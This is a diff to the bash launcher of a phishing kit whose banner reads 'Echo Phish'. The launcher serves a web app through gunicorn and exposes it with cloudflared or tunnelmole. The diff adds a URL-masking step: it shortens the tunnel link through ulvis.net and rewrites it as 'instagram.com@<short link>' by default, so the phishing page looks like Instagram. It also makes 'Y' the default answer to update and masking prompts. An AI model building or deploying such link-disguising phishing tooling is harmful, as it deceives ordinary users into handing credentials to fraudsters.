@@ -8,6 +8,24 @@ BLUE='\033[0;34m'
 BOLD='\033[1m'
 RESET='\033[0m'
 
+export VERSION=2.4
+
+banner() {
+    echo -e "${CYAN} _____                                                     _____ "
+    echo -e "( ___ )                                                   ( ___ )"
+    echo -e " |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | "
+    echo -e " |   |  ______     _             _____  _     _     _      |   | "
+    echo -e " |   | |  ____|   | |           |  __ \\| |   (_)   | |     |   | "
+    echo -e " |   | | |__   ___| |__   ___   | |__) | |__  _ ___| |__   |   | "
+    echo -e " |   | |  __| / __| '_ \\ / _ \\  |  ___/| '_ \\| / __| '_ \\  |   | "
+    echo -e " |   | | |___| (__| | | | (_) | | |    | | | | \\__ \\ | | | |   | "
+    echo -e " |   | |______\\___|_| |_|\\___/  |_|    |_| |_|_|___/_| |_| |   | "
+    echo -e " |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| "
+    echo -e "(_____)                                                   (_____)${RESET}${YELLOW}"
+    echo -e "           https://t.me/AzerbaijanTermux        V ${VERSION}\n"
+    echo -e "${RED}    "
+}
+
 cleanup() {
     if pgrep -f "cloudflared" > /dev/null; then
         killall cloudflared
@@ -42,8 +60,10 @@ check_update() {
     REMOTE_COMMIT=$(git rev-parse origin/$(git rev-parse --abbrev-ref HEAD))
 
     if [ "$LOCAL_COMMIT" != "$REMOTE_COMMIT" ]; then
-        echo -e -n "\n${YELLOW} [ ? ] A new update is available. Do you want to update? (Yes/No): ${YELLOW}"
+        echo -e -n "\n${YELLOW} [ ? ] A new update is available. New version: ${VERSION} . Do you want to update? (Y/N): ${RESET}"
         read -r response
+        response=${response:-"Y"}
+
         if [[ "$response" =~ ^[Yy][Ee][Ss]$ || "$response" =~ ^[Yy]$ ]]; then
             echo -e "\n${YELLOW} [ ? ] Updating...\n${RESET}"
             sleep 1
@@ -63,23 +83,6 @@ check_update() {
         sleep 1
     fi
 }
-
-banner() {
-    echo -e "${CYAN} _____                                                     _____ "
-    echo -e "( ___ )                                                   ( ___ )"
-    echo -e " |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | "
-    echo -e " |   |  ______     _             _____  _     _     _      |   | "
-    echo -e " |   | |  ____|   | |           |  __ \\| |   (_)   | |     |   | "
-    echo -e " |   | | |__   ___| |__   ___   | |__) | |__  _ ___| |__   |   | "
-    echo -e " |   | |  __| / __| '_ \\ / _ \\  |  ___/| '_ \\| / __| '_ \\  |   | "
-    echo -e " |   | | |___| (__| | | | (_) | | |    | | | | \\__ \\ | | | |   | "
-    echo -e " |   | |______\\___|_| |_|\\___/  |_|    |_| |_|_|___/_| |_| |   | "
-    echo -e " |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| "
-    echo -e "(_____)                                                   (_____)${RESET}${YELLOW}"
-    echo -e "           https://t.me/AzerbaijanTermux        V2.3\n"
-    echo -e "${RED}    "
-}
-
 
 cloudflared_install() {
     if [ -d "/data/data/com.termux" ]; then
@@ -166,7 +169,7 @@ check_dependencies() {
 install_python_dependencies() {
     if [ ! -f "./env/bin/activate" ]; then
         echo -e "\n${RED} [ ! ] Virtual environment not found, creating...${RESET}\n"
-        sleep 2
+        sleep 1
         python3 -m venv env
     fi
     source ./env/bin/activate
@@ -177,6 +180,42 @@ install_python_dependencies() {
     echo -e "\n${GREEN} [ + ] Dependencies installed and virtual environment activated.${RESET}\n"
     sleep 2
 }
+
+mask_url() {
+    local long_url="$1"
+    
+    echo -e "\n${GREEN} [ + ] URL shortening...${RESET}"
+    sleep 1
+    local short_url=$(short_url "$long_url")
+
+    echo -e -n "\n${YELLOW} [ ? ] Enter your custom domain (default: instagram.com): ${RESET}"
+    read -r custom_domain
+    custom_domain=${custom_domain:-"instagram.com"}
+    
+    echo -e "\n${GREEN} [ + ] URL masking...${RESET}\n"
+    local masked_url=$(echo "$short_url" | sed "s|//|://${custom_domain}@|")
+    sleep 3
+    clear
+    banner
+
+    echo -e "${YELLOW} \n   Masked url: "
+    echo -e "------------------------------------------------"
+    echo -e "${GREEN} [ + ] ${masked_url}${YELLOW}"
+    echo -e "------------------------------------------------"
+}
+
+short_url() {
+    local long_url="$1"
+    local api_endpoint="https://ulvis.net/API/write/post"
+    
+    local response=$(curl -s -X POST -d "url=$long_url" "$api_endpoint" 2>/dev/null)
+    if echo "$response" | jq -e '.success' >/dev/null 2>&1; then
+        echo "$(echo "$response" | jq -r '.data.url')"
+    else
+        echo "$long_url"  
+    fi
+}
+
 
 select_methode () {
     clear
@@ -221,10 +260,10 @@ select_methode () {
         1)
             echo -e "${GREEN} [ + ] Starting the application on port $port ...${RESET}"
             gunicorn --bind 0.0.0.0:$port web_app:app 2>/dev/null &  
-            sleep 2
+            sleep 1
             clear
             banner
-            echo -e "\n${YELLOW} URLs: "
+            echo -e "\n${YELLOW}   Local url: "
             echo -e "------------------------------------------------"
             echo -e "${GREEN} [ + ] http://127.0.0.1:$port${YELLOW}"
             echo -e "------------------------------------------------"
@@ -233,22 +272,32 @@ select_methode () {
         2)
             echo -e "${GREEN} [ + ] Starting the application on port $port ...${RESET}"
             gunicorn --bind 0.0.0.0:$port web_app:app 2>/dev/null &  
-            sleep 2
+            sleep 1
             cloudflared tunnel --no-autoupdate --metrics localhost:55555 --url http://localhost:$port 2>/dev/null & 
             echo -e "\n${GREEN} [ + ] Cloudflared starting...."
 
-            result=""
-            while [[ -z "$result" || "$result" == "null" ]]; do
-                result=$(curl -s http://localhost:55555/quicktunnel | jq -r '.hostname')
+            original_url=""
+            while [[ -z "$original_url" || "$original_url" == "null" ]]; do
+                original_url=$(curl -s http://localhost:55555/quicktunnel | jq -r '.hostname')
                 sleep 1 
             done
 
             clear
             banner
-            echo -e "${YELLOW} \nURLs: "
+            echo -e "${YELLOW} \n   Original url: "
             echo -e "------------------------------------------------"
-            echo -e "${GREEN} [ + ] https://${result}${YELLOW}"
+            echo -e "${GREEN} [ + ] https://${original_url}${YELLOW}"
             echo -e "------------------------------------------------"
+
+            echo -e -n "\n${YELLOW} [ ? ] Do you want mask url? (Y/N): ${RESET}"
+            read -r response
+            response=${response:-"Y"}
+
+            if [[ "$response" =~ ^[Yy][Ee][Ss]$ || "$response" =~ ^[Yy]$ ]]; then
+                mask_url https://${original_url}
+            else
+                echo -e "\n${RED} [ ! ] Url masking skipped.${RESET}\n"
+            fi
             ;;
 
         3)
@@ -260,7 +309,7 @@ select_methode () {
             clear
             banner
             tunnelmole $port 
-            sleep 2
+            sleep 1
             ;;
 
         *)
